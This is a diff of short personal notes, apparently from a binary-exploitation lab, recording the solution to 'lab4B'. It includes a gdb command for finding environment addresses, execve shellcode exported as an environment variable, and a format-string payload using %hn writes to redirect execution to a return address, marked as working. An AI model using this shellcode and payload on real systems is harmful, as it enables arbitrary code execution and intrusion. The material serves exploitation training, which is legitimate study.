@@ -1,3 +1,19 @@
-Find env address in gdb 
+###Find env address in gdb 
 
 x/s *((char **)environ)  (after running the programm)
+
+
+### lab4B solv steps
+
+ export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
+for returtn address 0xbffff96c
+bfff -8 = 49143
+f96c -bfff  = 14701
+in shell 
+(python -c 'print "\xba\x99\x04\x08\xb8\x99\x04\x08"+"%49143x%6$hn%14701x%7$hn"')|fixenv ./lab4B
+
+working
+
+
+r < <(python -c 'print "\xba\x99\x04\x08\xb8\x99\x04\x08"+"%49143x%6$hn%14701x%7$hn"')
